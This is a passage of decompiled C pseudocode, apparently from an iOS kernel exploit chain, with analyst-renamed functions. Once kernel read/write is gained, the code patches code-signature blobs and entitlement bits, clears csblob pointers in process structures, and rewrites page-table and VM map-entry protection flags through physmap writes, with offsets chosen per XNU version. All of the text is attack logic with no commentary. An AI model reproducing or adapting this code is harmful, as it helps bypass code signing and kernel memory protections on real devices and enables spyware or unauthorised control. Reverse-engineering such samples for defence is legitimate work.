        if ( !(unsigned int)krw_read_thunk(krwCtx, blobDataKaddrRead, blobSizeRead, v18) )
          goto LABEL_110;
        ctx->flags = csFlags;
        blobSize = blobSizeRead;
        blobDataKaddr = blobDataKaddrRead;
        ctx->csblobKaddr = csblobKaddr;
        ctx->blobSize = blobSize;
        chainHeadKaddr = chainHeadOut;
        ctx->blobDataKaddr = blobDataKaddr;
        ctx->chainHeadKaddr = chainHeadKaddr;
        ctx->teamIdOrEntitlementsKaddr = teamIdOrEntitlementsKaddr;
        ctx->pid = a2;
        specialSlotOffset = specialSlotKaddr ? (unsigned int)(specialSlotKaddr - blobDataKaddr) : 0LL;
        ctx->specialSlotOffset = specialSlotOffset;
        if ( blobSize <= specialSlotOffset )
          goto LABEL_110;
        alternateSlotOffset = alternateSlotKaddr ? (unsigned int)(alternateSlotKaddr - blobDataKaddr) : 0LL;
        ctx->alternateSlotOffset = alternateSlotOffset;
        if ( (uint32_t)alternateSlotOffset )
        {
          if ( blobSize <= alternateSlotOffset && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)) )
            goto LABEL_110;
        }
        cmsBlobOffset = cmsBlobKaddr ? (unsigned int)(cmsBlobKaddr - blobDataKaddr) : 0LL;
        ctx->cmsBlobOffset = cmsBlobOffset;
        if ( (uint32_t)cmsBlobOffset )
        {
          if ( blobSize <= cmsBlobOffset )
            goto LABEL_110;
        }
        LODWORD(blobDataKaddr) = signatureKaddr - blobDataKaddr;
        blobDataKaddr = signatureKaddr ? (unsigned int)blobDataKaddr : 0LL;
        ctx->signatureOffset = blobDataKaddr;
        if ( (uint32_t)blobDataKaddr )
        {
          if ( blobSize <= blobDataKaddr )
            goto LABEL_110;
        }
        if ( *blobBytes == 34397946 )
        {
          container = (unsigned int *)csblob_alloc_container();
          if ( !container )
            goto LABEL_110;
          v39 = csblob_dup_entry(blobBytes);
          if ( v39 )
          {
            v35 = v39;
            if ( (unsigned int)csblob_realloc_array(container, 0, (__int64)v39) != -1 )
            {
              LODWORD(v37) = 0;
              v40 = 0;
              ctx->containerKind = 1;
              ctx->container = container;
              ctx->selectedSlot = 0;
LABEL_104:
              ctx->minSlotDistanceQword = v37;
              v53 = csblob_find_entry(ctx, v40, -86111230);
              if ( v53 )
              {
                ctx->platformByte = *((unsigned __int8 *)v53 + 36);
                if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)
                  || !csblob_find_entry(ctx, 7, -86085262)
                  || csblob_find_entry(ctx, 5, -86085263)
                  || (unsigned int)csblob_zero_entry_region(ctx, 5u, -86085263) )
                {
                  v17 = 1;
LABEL_111:
                  free(blobBytes);
                  return v17;
                }
              }
LABEL_110:
              csblob_free_entry(ctx);
              v17 = 0;
              goto LABEL_111;
            }
LABEL_83:
            csblob_bzero_and_free(v35);
          }
        }
        else
        {
          if ( *blobBytes != -1072898310 )
            goto LABEL_110;
          container = (unsigned int *)csblob_alloc_container();
          if ( !container )
            goto LABEL_110;
          v54 = specialSlotOffset;
          v26 = blobBytes[2];
          if ( v26 )
          {
            v27 = 0;
            v28 = bswap32(v26);
            v29 = blobBytes + 4;
            while ( 1 )
            {
              v30 = v29;
              v31 = *(v29 - 1);
              v32 = bswap32(*v29);
              if ( (unsigned int)v32 < v27 || v27 == 0 )
                v27 = v32;
              v34 = csblob_dup_entry((unsigned int *)((char *)blobBytes + v32));
              if ( !v34 )
                goto LABEL_84;
              v35 = v34;
              v36 = bswap32(v31);
              if ( (unsigned int)csblob_realloc_array(container, v36, (__int64)v34) == -1 )
                goto LABEL_83;
              if ( *v35 == 34397946 )
              {
                if ( v54 )
                {
                  if ( (uint32_t)v32 != v54 )
                    goto LABEL_75;
                  goto LABEL_74;
                }
                if ( !v31 )
                {
                  v36 = 0;
LABEL_74:
                  ctx->selectedSlot = v36;
                }
              }
LABEL_75:
              v29 = v30 + 2;
              if ( !--v28 )
              {
                v37 = ((unsigned __int64)v27 + 0x7FFFFFFF4LL) >> 3;
                goto LABEL_86;
              }
            }
          }
          LODWORD(v37) = -2;
LABEL_86:
          v40 = ctx->selectedSlot;
          v41 = *container;
          if ( !(uint32_t)v41 )
            goto LABEL_103;
          v42 = 0;
          v43 = 0;
          v44 = 0;
          v45 = 0;
          v46 = (unsigned int **)(*((uint64_t *)container + 1) + 8LL);
          do
          {
            v47 = *((uint32_t *)v46 - 2);
            v48 = bswap32(**v46);
            if ( v48 == -86111230 )
            {
              if ( v47 == v40 )
                v43 = *v46;
            }
            else if ( v48 == -86085263 && v47 == 5 )
            {
              v45 = v42;
              v44 = *v46;
            }
            ++v42;
            v46 += 2;
          }
          while ( v41 != v42 );
          if ( !v44 )
            goto LABEL_103;
          v49 = bswap32(v44[1]);
          if ( !v43 || (v50 = v43[10], !(uint32_t)v50) || (v50 & 0x3FFF) != 0 )
            v50 = v49 + 1;
          v51 = (char *)realloc(v44, v50);
          if ( v51 )
          {
            v52 = v51;
            bzero(&v51[v49], v50 - v49);
            *(uint64_t *)(*((uint64_t *)container + 1) + 16LL * v45 + 8) = v52;
            v40 = ctx->selectedSlot;
LABEL_103:
            ctx->containerKind = 1;
            ctx->container = container;
            goto LABEL_104;
          }
        }
LABEL_84:
        csblob_free_array(container);
        goto LABEL_110;
      }
    }
    return 0;
  }
  return v17;
}

//----- (000000000002EB4C) ----------------------------------------------------
__int64 __fastcall krw_read_with_version_check(struct_krwCtx *krwCtx, unsigned int a2, unsigned __int64 a3, bool *a4)
{
  __int64 result; // x0
  int v7; // w8
  int v9; // w21
  int v12; // [xsp+Ch] [xbp-24h] BYREF

  result = 0;
  v12 = 0;
  v7 = krwCtx->xnuMajorVersion;
  if ( v7 <= 8791 )
  {
    if ( (unsigned int)(v7 - 8019) >= 2 )
    {
      if ( v7 != 6153 && v7 != 7195 )
        return result;
      v9 = 0x20000;
LABEL_18:
      result = traverse_sptm_pgtable_chain(krwCtx, a2, a3);
      if ( result )
      {
        result = krw_read_thunk(krwCtx, result + 72, 4, &v12);
        if ( (uint32_t)result )
        {
          *a4 = (v12 & v9) != 0;
          return 1;
        }
      }
      return result;
    }
LABEL_17:
    v9 = 0x80000;
    goto LABEL_18;
  }
  if ( v7 == 8792 || v7 == 10002 || v7 == 8796 )
    goto LABEL_17;
  return result;
}

//----- (000000000002EC1C) ----------------------------------------------------
__int64 __fastcall kwrite_with_version_check(struct_krwCtx *krwCtx, unsigned int a2, unsigned __int64 a3, int a4)
{
  __int64 result; // x0
  int v7; // w8
  int v9; // w22
  __int64 v12; // x21
  int v13; // w8
  int v14; // [xsp+Ch] [xbp-24h] BYREF

  result = 0;
  v14 = 0;
  v7 = krwCtx->xnuMajorVersion;
  if ( v7 > 8791 )
  {
    if ( v7 != 8792 && v7 != 10002 && v7 != 8796 )
      return result;
  }
  else if ( (unsigned int)(v7 - 8019) >= 2 )
  {
    if ( v7 != 6153 && v7 != 7195 )
      return result;
    v9 = 0x20000;
    goto LABEL_18;
  }
  v9 = 0x80000;
LABEL_18:
  result = traverse_sptm_pgtable_chain(krwCtx, a2, a3);
  if ( result )
  {
    v12 = result + 72;
    result = krw_read_thunk(krwCtx, result + 72, 4, &v14);
    if ( (uint32_t)result )
    {
      if ( a4 )
        v13 = v14 | v9;
      else
        v13 = v14 & ~v9;
      v14 = v13;
      return (unsigned int)kwrite_with_retry(krwCtx, v12, (__int64)&v14, 4) != 0;
    }
  }
  return result;
}

//----- (000000000002ED14) ----------------------------------------------------
__int64 __fastcall setup_physmap_and_wire_region(
                                                 struct_krwCtx *krwCtx,
        unsigned int a2,
        unsigned __int64 a3,
        mach_vm_size_t a4,
        vm_prot_t a5,
        int a6,
        int a7)
{
  __int64 result; // x0
  int v15; // w27
  unsigned __int64 v16; // x19
  int v17; // w8
  int v18; // w9
  int v19; // w8
  unsigned __int64 v20; // x0
  __int64 v22; // x19
  unsigned __int64 vmPageSizeForTask; // x23
  unsigned __int64 trailingBytes; // x8
  unsigned __int64 paddedBytes; // x8
  size_t pageCount; // x25
  uint64_t *wiredEntries; // x27
  char v28; // w26
  __int64 v29; // x19
  int v31; // w2
  unsigned __int64 v32; // x0
  __int64 v33; // x8
  __int64 v34; // x9
  mach_vm_size_t v35; // x28
  mach_port_t v36; // w26
  unsigned __int64 v37; // x25
  mach_vm_address_t *v38; // x19
  uint32_t *v39; // x2
  unsigned __int64 v40; // x0
  unsigned __int64 v41; // x23
  int v42; // w0
  unsigned __int64 v43; // x8
  int v45; // w9
  __int64 v46; // x23
  kern_return_t v47; // w0
  __int64 v48; // x19
  mach_vm_address_t *v49; // x25
  mach_vm_address_t v50; // t1
  unsigned __int64 roundedSize; // [xsp+10h] [xbp-130h]
  int v52; // [xsp+10h] [xbp-130h]
  vm_prot_t desired_access; // [xsp+18h] [xbp-128h]
  vm_prot_t desired_accessa; // [xsp+18h] [xbp-128h]
  int v55; // [xsp+1Ch] [xbp-124h]
  int v56; // [xsp+1Ch] [xbp-124h]
  int v57; // [xsp+20h] [xbp-120h]
  int v58; // [xsp+24h] [xbp-11Ch]
  unsigned __int64 v59; // [xsp+28h] [xbp-118h]
  unsigned __int64 v60; // [xsp+30h] [xbp-110h] BYREF
  mach_vm_address_t v61; // [xsp+38h] [xbp-108h] BYREF
  unsigned __int64 v62; // [xsp+40h] [xbp-100h] BYREF
  unsigned __int64 v63; // [xsp+48h] [xbp-F8h] BYREF
  union {
    mach_vm_address_t allocatedPages[16];
    struct vm_map_entry_wire_snapshot mapEntry;
  } scratch; // [xsp+50h] [xbp-F0h] BYREF
  uint32_t v72[2]; // [xsp+D8h] [xbp-68h] BYREF

  result = physmap_pgtable_check_and_append(krwCtx, a2);
  if ( (uint32_t)result )
  {
    if ( !a4 )
      return 1;
    result = get_task_vm_info_1(a2);
    if ( (uint32_t)result )
    {
      v15 = result;
      result = scan_and_validate_kaddr(krwCtx, a2, a3, &v60);
      if ( result )
      {
        v16 = result;
        result = 0;
        v17 = krwCtx->xnuMajorVersion;
        if ( v17 > 8791 )
        {
          if ( v17 != 8792 && v17 != 10002 )
          {
            v18 = 8796;
LABEL_12:
            if ( v17 != v18 )
              return result;
          }
        }
        else if ( (unsigned int)(v17 - 8019) >= 2 )
        {
          if ( v17 == 6153 )
          {
            v58 = 0x40000;
            v19 = -524545;
LABEL_14:
            v57 = v19;
            result = kread_physmap_decorated(krwCtx, v16, &v61);
            if ( (uint32_t)result )
            {
              v59 = v16;
              if ( !krwCtx->gap_0x1F0 )
              {
                v52 = a7;
                v56 = a6;
                memset(&scratch, 0, sizeof(scratch));
                v35 = vm_page_size;
                v36 = mach_task_self_;
                if ( mach_vm_allocate(mach_task_self_, scratch.allocatedPages, vm_page_size, 9) )
                  return 0;
                desired_accessa = a5;
                v37 = 0;
                v38 = &scratch.allocatedPages[1];
                while ( 1 )
                {
                  v39 = (uint32_t *)*(v38 - 1);
                  *v39 = 0;
                  v40 = scan_and_validate_kaddr(krwCtx, v36, (unsigned __int64)v39, &v62);
                  if ( v40 )
                  {
                    v41 = v40;
                    if ( (unsigned int)krw_read_thunk(krwCtx, v40, 8, v72) )
                    {
                      v42 = kread_physmap_decorated(krwCtx, v41 + 32, &v63);
                      v43 = v63;
                      if ( v42 && v63 != 0 )
                      {
                        v45 = v72[0];
                        if ( (v72[0] & 0x80000000) != 0 && v72[0] == v72[1] )
                        {
                          krwCtx->gap_0x1F8 = 48;
                          krwCtx->gap_0x1F0 = v43 - (unsigned int)(48 * v45);
                        }
                      }
                    }
                  }
                  v46 = krwCtx->gap_0x1F0;
                  if ( v37 > 0xE || v46 )
                    break;
                  v47 = mach_vm_allocate(v36, v38++, v35, 9);
                  ++v37;
                  if ( v47 )
                    goto LABEL_68;
                }
                LODWORD(v37) = v37 + 1;
LABEL_68:
                v48 = (unsigned int)v37;
                v49 = scratch.allocatedPages;
                a6 = v56;
                do
                {
                  v50 = *v49++;
                  mach_vm_deallocate(mach_task_self_, v50, v35);
                  --v48;
                }
                while ( v48 );
                a5 = desired_accessa;
                a7 = v52;
                if ( !v46 )
                  return 0;
              }
              v20 = port_right_index_to_kaddr(krwCtx, v61);
              v61 = v20;
              if ( !v20 || v20 == v59 )
              {
                return 0;
              }
              else
              {
                v22 = v20;
                desired_access = a5;
                vmPageSizeForTask = v15;
                trailingBytes = a4 % v15;
                if ( trailingBytes )
                  paddedBytes = v15 - trailingBytes;
                else
                  paddedBytes = 0;
                roundedSize = paddedBytes + a4;
                pageCount = (paddedBytes + a4) / v15;
                result = (__int64)calloc(pageCount, 8u);
                if ( result )
                {
                  wiredEntries = (uint64_t *)result;
                  v55 = a6;
                  v28 = 0;
                  do
                  {
                    if ( !(unsigned int)krw_read_thunk(krwCtx, v22, 48, &scratch.mapEntry) )
                      goto LABEL_66;
                    if ( (v28 & 1) != 0 )
                    {
                      if ( (uint32_t)v63 != scratch.mapEntry.pageQueueOrIndex )
                        goto LABEL_66;
                    }
                    else
                    {
                      LODWORD(v63) = scratch.mapEntry.pageQueueOrIndex;
                    }
                    v29 = scratch.mapEntry.start;
                    if ( scratch.mapEntry.start >= v60 && scratch.mapEntry.start < v60 + a4 )
                    {
                      if ( (scratch.mapEntry.protectionBits & 0x140) == 0 )
                        goto LABEL_66;
                      v31 = a7 ? scratch.mapEntry.maxProtectionAndFlags & ~v58 : (scratch.mapEntry.maxProtectionAndFlags & v57) | v58;
                      if ( !noppl_kwrite32(krwCtx, v61 + 44, v31) )
                        goto LABEL_66;
                      wiredEntries[(v29 - v60) / vmPageSizeForTask] = v61;
                    }
                    v61 = scratch.mapEntry.next;
                    v32 = port_right_index_to_kaddr(krwCtx, scratch.mapEntry.next);
                    v61 = v32;
                    if ( !v32 )
                      goto LABEL_66;
                    v22 = v32;
                    v28 = 1;
                  }
                  while ( v59 != v32 );
                  if ( roundedSize >= vmPageSizeForTask )
                  {
                    v33 = 0;
                    v34 = pageCount;
                    if ( pageCount <= 1 )
                      v34 = 1;
                    while ( wiredEntries[v33] )
                    {
                      if ( ++v33 == v34 )
                        goto LABEL_47;
                    }
LABEL_66:
                    free(wiredEntries);
                    return 0;
                  }
LABEL_47:
                  free(wiredEntries);
                  if ( !v55 )
                    return 1;
                  return mach_vm_wire(krwCtx->hostPrivPort, a2, a3, a4, desired_access) == 0;
                }
              }
            }
            return result;
          }
          v18 = 7195;
          goto LABEL_12;
        }
        v58 = 3932160;
        v19 = -62914817;
        goto LABEL_14;
      }
    }
  }
  return result;
}

//----- (000000000002F194) ----------------------------------------------------
bool __fastcall csblob_modify_entitlement_bits(struct_krwCtx *krwCtx, unsigned int a2, int a3, int a4)
{
  unsigned int *v7; // x0
  uint64_t v8; // x19
  unsigned __int64 v10; // x9
  __int64 v11; // x8
  unsigned __int64 v12; // x10
  __int64 v13; // x11
  unsigned __int64 v14; // x8
  struct csblob_walk_ctx v15; // [xsp+8h] [xbp-88h] BYREF

  if ( !(unsigned int)csblob_read_and_patch(krwCtx, a2, (__int64)&v15) )
    return 0;
  v7 = csblob_find_entry(&v15, 0, -86111230);
  if ( v7 && bswap32(v7[2]) >> 10 >= 0x81 )
  {
    v10 = *((uint64_t *)v7 + 10);
    v11 = 16;
    if ( !a3 )
      v11 = 0;
    v12 = bswap64(v10 & 0xAFFFFFFFFFFFFFFFLL);
    v13 = 64;
    if ( !a4 )
      v13 = 0;
    v14 = v13 | v11 | v12;
    if ( v14 == bswap64(v10) )
    {
      v8 = 1;
      goto LABEL_5;
    }
    *((uint64_t *)v7 + 10) = bswap64(v14);
    if ( (unsigned int)csblob_replace_entry(&v15, 0, v7) )
    {
      v8 = (unsigned int)csblob_apply_with_physmap_write(krwCtx, (__int64)&v15) != 0;
      goto LABEL_5;
    }
  }
  v8 = 0;
LABEL_5:
  csblob_free_entry(&v15);
  return v8;
}

//----- (000000000002F294) ----------------------------------------------------
__int64 __fastcall check_csblob_patchable(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  struct csblob_walk_ctx v3; // [xsp+8h] [xbp-68h] BYREF

  result = csblob_read_and_patch(krwCtx, a2, (__int64)&v3);
  if ( (uint32_t)result )
  {
    csblob_free_entry(&v3);
    return 1;
  }
  return result;
}

//----- (000000000002F2C8) ----------------------------------------------------
unsigned __int64 __fastcall patch_csblob_in_all_procs(struct_krwCtx *krwCtx, unsigned int a2, __int64 a3)
{
  __int64 v2; // x19
  unsigned int v4; // w21
  struct_krwCtx *v5; // x20
  unsigned __int64 result; // x0
  unsigned __int64 v7; // x22
  int v9; // w8
  __int64 v10; // x1
  __int64 *v11; // x28
  __int64 v12; // x2
  unsigned __int64 xnuVersionPacked; // x8
  char *blobPointerField; // x9
  __int64 v15; // x9
  __int64 v16; // x21
  int v17; // w0
  __int64 v18; // x23
  int v19; // w21
  char *v20; // x21
  bool v21; // zf
  int v22; // w0
  int v23; // w8
  unsigned __int64 v24; // x24
  char *v25; // x27
  char *v26; // x28
  __int64 v27; // x8
  __int64 v28; // x24
  unsigned __int64 v29; // x23
  unsigned __int64 v30; // x24
  __int64 v31; // x9
  __int64 v32; // x10
  unsigned __int64 *v33; // x2
  struct_krwCtx *v34; // x0
  unsigned __int64 v35; // x1
  mach_vm_size_t v36; // x3
  struct csblob_procinfo_header *procInfoHeader; // x8
  struct csblob_procinfo_entry *procInfoEntry; // x8
  __int64 *v37; // [xsp+10h] [xbp-11F0h]
  int v38; // [xsp+18h] [xbp-11E8h]
  int v39; // [xsp+1Ch] [xbp-11E4h]
  __int64 v40; // [xsp+20h] [xbp-11E0h]
  __int64 v41; // [xsp+28h] [xbp-11D8h] BYREF
  unsigned int v42; // [xsp+30h] [xbp-11D0h] BYREF
  unsigned int v43; // [xsp+34h] [xbp-11CCh] BYREF
  __int64 address; // [xsp+38h] [xbp-11C8h] BYREF
  unsigned __int64 v45; // [xsp+40h] [xbp-11C0h] BYREF
  unsigned __int64 v46; // [xsp+48h] [xbp-11B8h] BYREF
  __int64 v47; // [xsp+50h] [xbp-11B0h] BYREF
  __int64 v48; // [xsp+58h] [xbp-11A8h] BYREF
  __int64 v49; // [xsp+60h] [xbp-11A0h] BYREF
  int newBytes; // [xsp+6Ch] [xbp-1194h] BYREF
  uint8_t v51[4]; // [xsp+70h] [xbp-1190h] BYREF
  int __fd; // [xsp+74h] [xbp-118Ch] BYREF
  __int64 v53; // [xsp+78h] [xbp-1188h] BYREF
  mach_vm_address_t v54; // [xsp+80h] [xbp-1180h] BYREF
  unsigned __int64 v55; // [xsp+88h] [xbp-1178h] BYREF
  uint8_t csblobHeader[200]; // [xsp+90h] [xbp-1170h] BYREF
  uint64_t v59[7]; // [xsp+160h] [xbp-10A0h] BYREF
  uint8_t procInfoInline[0x1000]; // [xsp+198h] [xbp-1068h] BYREF

  v2 = a3;
  v4 = a2;
  v5 = krwCtx;
  v47 = 0;
  v48 = 0;
  v45 = 0;
  v46 = 0;
  address = 0;
  result = kread_task_struct(krwCtx, a2);
  if ( result )
  {
    v7 = result;
    result = get_csblob_offset_pair((__int64)v5, (int *)&v48 + 1, (int *)&v48);
    if ( (uint32_t)result )
    {
      if ( !kread_physmap_decorated(v5, v7 + HIDWORD(v48), (unsigned __int64 *)&v47) || v47 == 0 )
        return 0;
      result = walk_proc_and_get_csblob_addr(v5, v4, &v46);
      if ( !(uint32_t)result )
        return result;
      result = get_csblob_size_pair((__int64)v5, &v43, &v42);
      if ( !(uint32_t)result )
        return result;
      result = kread_physmap_decorated(v5, v47 + v43, &v45);
      if ( !(uint32_t)result )
        return result;
      if ( !v45 )
        return 0;
      v9 = kread_physmap_decorated(v5, v45 + v42, (unsigned __int64 *)&address);
      result = 0;
      if ( v9 )
      {
        v10 = address;
        if ( address )
        {
          procInfoHeader = (struct csblob_procinfo_header *)procInfoInline;
          v11 = (__int64 *)procInfoHeader->entries;
          while ( 1 )
          {
            v12 = v5->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 48LL : 64LL;
            memset(csblobHeader, 0, sizeof(csblobHeader));
            if ( !(unsigned int)krw_read_thunk(v5, v10, v12, csblobHeader) )
              break;
            xnuVersionPacked = v5->xnuVersionPacked;
            blobPointerField = (char *)csblobHeader + 40;
            if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
              blobPointerField = (char *)csblobHeader + 24;
            if ( !(*(uint64_t *)blobPointerField >> 29) )
            {
              v15 = 144;
              if ( xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
                v15 = 152;
              if ( xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
                v15 = 168;
              if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
                v16 = v15;
              else
                v16 = 160;
              if ( !kread_physmap_decorated(v5, address + v16, (unsigned __int64 *)&v41) )
                break;
              if ( v41 && (v2 == 0 || v41 == v2) )
              {
                if ( !validate_kaddr_range((__int64)v5, v41) )
                  break;
                if ( !kwrite64_dispatch(v5, address + v16, 0) )
                  break;
                if ( v5->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
                {
                  v40 = address;
                  v18 = v46;
                  v54 = 0;
                  v55 = v46;
                  v53 = 0;
                  __fd = -1;
                  if ( !(unsigned int)wire_proc_page_via_kobject(v5, v47, &v54, &v53, &__fd)
                    || (v19 = __fd, (unsigned int)pread_loop(__fd, (__int64)procInfoInline, 0x1000u, v18)) )
                  {
                    v20 = 0;
                    v39 = 0;
                    goto LABEL_39;
                  }
                  v38 = v19;
                  v23 = procInfoHeader->entryBytes;
                  v24 = (unsigned int)(v23 + 32);
                  if ( (unsigned int)v24 <= 0x1000 )
                  {
                    v20 = 0;
                    v37 = v11;
                    v25 = (char *)v11;
                  }
                  else
                  {
                    v20 = (char *)malloc(v24);
                    if ( !v20 || (unsigned int)pread_loop(v38, (__int64)v20, v24, v18) )
                    {
                      v39 = 0;
                      goto LABEL_39;
                    }
                    v37 = v11;
                    v25 = v20 + 32;
                    v23 = *((uint32_t *)v20 + 5);
                  }
                  v26 = &v25[v23];
                  if ( v25 >= v26 )
                  {
                    v39 = 0;
LABEL_74:
                    v11 = v37;
LABEL_39:
                    if ( v54 )
                      v21 = v53 == 0;
                    else
                      v21 = 1;
                    if ( !v21 )
                      kwrite64((__int64)v5, v54, v53);
                    if ( __fd != -1 )
                      close(__fd);
                    if ( v20 )
                      free(v20);
                    if ( !v39 )
                      break;
                    goto LABEL_49;
                  }
                  v39 = 0;
                  while ( 2 )
                  {
                    procInfoEntry = (struct csblob_procinfo_entry *)v25;
                    if ( procInfoEntry->type == 29 )
                    {
                      newBytes = 14;
                      v49 = 0x7F00000000000000LL;
                      v27 = 8;
                      if ( v5->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
                      {
                        v28 = 24;
                      }
                      else
                      {
                        v27 = 24;
                        v28 = 40;
                      }
                      v29 = v27 + v40;
                      if ( (unsigned int)krw_read_thunk(v5, v27 + v40, 4, v51) )
                      {
                        if ( (unsigned int)kwritebuf_universal(v5, v29, &newBytes, 4u) )
                        {
                          v30 = v28 + v40;
                          if ( (unsigned int)kwritebuf_universal(v5, v30, &v49, 8u) )
                          {
                            v31 = procInfoEntry->fileOffset;
                            v32 = procInfoEntry->fileLength;
                            v59[0] = v55;
                            v59[1] = v31;
                            v59[2] = v32;
                            if ( fcntl(v38, 61, v59) )
                            {
                              kwritebuf_universal(v5, v29, v51, 4u);
                              v33 = &v55;
                              v34 = v5;
                              v35 = v30;
                              v36 = 8;
                              goto LABEL_69;
                            }
                            v39 = 1;
                          }
                          else
                          {
                            v33 = (unsigned __int64 *)v51;
                            v34 = v5;
                            v35 = v29;
                            v36 = 4;
LABEL_69:
                            kwritebuf_universal(v34, v35, v33, v36);
                          }
                        }
                      }
                    }
                    v25 += procInfoEntry->size;
                    if ( v25 >= v26 )
                      goto LABEL_74;
                    continue;
                  }
                }
              }
            }
LABEL_49:
            v22 = kread_physmap_decorated(v5, address, (unsigned __int64 *)&address);
            v10 = address;
            if ( !v22 || !address )
              return v10 == 0;
          }
          v10 = address;
          return v10 == 0;
        }
      }
    }
  }
  return result;
}
// 2F300: variable 'v1' is possibly undefined
// 2F304: variable 'v3' is possibly undefined
// 2F4FC: variable 'v17' is possibly undefined
// 48940: using guessed type __int64 __chkstk_darwin(void);
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (000000000002F7BC) ----------------------------------------------------
__int64 __fastcall walk_csblob_chain_for_offset(struct_krwCtx *krwCtx, int a2)
{
  __int64 result; // x0
  unsigned __int64 v5; // x20
  int v6; // w0
  unsigned int v7; // [xsp+8h] [xbp-28h] BYREF
  unsigned int v8; // [xsp+Ch] [xbp-24h] BYREF
  __int64 v9; // [xsp+10h] [xbp-20h] BYREF
  __int64 v10; // [xsp+18h] [xbp-18h] BYREF

  v9 = 0;
  v10 = 0;
  result = get_csblob_size_pair(krwCtx, &v8, &v7);
  if ( (uint32_t)result )
  {
    if ( (unsigned int)validate_port_set_chain(krwCtx, a2, &v10) )
    {
      return 0;
    }
    else
    {
      result = kread_physmap_decorated(krwCtx, v10 + v8, (unsigned __int64 *)&v10);
      if ( (uint32_t)result )
      {
        result = validate_kaddr_range(krwCtx, v10);
        if ( result )
        {
          v5 = v10 + v7;
          result = kread_physmap_decorated(krwCtx, v5, (unsigned __int64 *)&v9);
          if ( (uint32_t)result )
          {
            if ( v9 )
            {
              result = validate_kaddr_range(krwCtx, v9);
              if ( result )
              {
                return kwrite64_dispatch(krwCtx, v5, 0) != 0;
              }
            }
            else
            {
              return 1;
            }
          }
        }
      }
    }
  }
  return result;
}
// 2F888: variable 'v6' is possibly undefined

//----- (000000000002F898) ----------------------------------------------------
unsigned __int64 __fastcall proc_kread_and_patch_slot(struct_krwCtx *krwCtx, unsigned int a2, __int64 a3)
{
  unsigned __int64 result; // x0
  unsigned __int64 v6; // x21
  __int64 v7; // [xsp+8h] [xbp-28h] BYREF

  v7 = 0;
  result = task_self_get_ipc_port(krwCtx, a2);
  if ( result )
  {
    result = get_task_struct_offset(krwCtx, result);
    if ( result )
    {
      v6 = result;
      result = kread_physmap_decorated(krwCtx, result, (unsigned __int64 *)&v7);
      if ( (uint32_t)result )
      {
        if ( (v7 & 4) != 0 )
          return 1;
        v7 |= (a3 & 0xFFFFFFFFFFFFF000LL) | 4;
        result = kwrite_physmap_with_a3_ptr(krwCtx, v6, v7);
        if ( (uint32_t)result )
          return 1;
      }
    }
  }
  return result;
}

//----- (000000000002F92C) ----------------------------------------------------
__int64 __fastcall csblob_find_slot_by_pair(struct csblob_walk_ctx *ctx, int slot, int magic)
{
  unsigned int *v3; // x9
  __int64 v4; // x8

  if ( ctx )
  {
    if ( ctx->containerKind == 1 && (v3 = (unsigned int *)ctx->container, v4 = *v3, (uint32_t)v4) )
    {
      __int64 result = *((uint64_t *)v3 + 1);
      for ( ; *(uint32_t *)result != slot || bswap32(**(uint32_t **)(result + 8)) != magic; result += 16 )
      {
        if ( !--v4 )
          return 0;
      }
      return result;
    }
    else
    {
      return 0;
    }
  }
  return 0;
}

//----- (000000000002F980) ----------------------------------------------------
void *__fastcall csblob_dup_entry(unsigned int *a1)
{
  size_t v2; // x21
  void *v3; // x0
  void *v4; // x19

  v2 = bswap32(a1[1]);
  v3 = malloc(v2);
  v4 = v3;
  if ( v3 )
    memcpy(v3, a1, v2);
  return v4;
}

//----- (000000000002F9D4) ----------------------------------------------------
void __fastcall csblob_bzero_and_free(uint32_t *a1)
{
  unsigned int v2; // w8

  if ( a1 )
  {
    v2 = a1[1];
    if ( v2 )
      bzero(a1, bswap32(v2));
    free(a1);
  }
}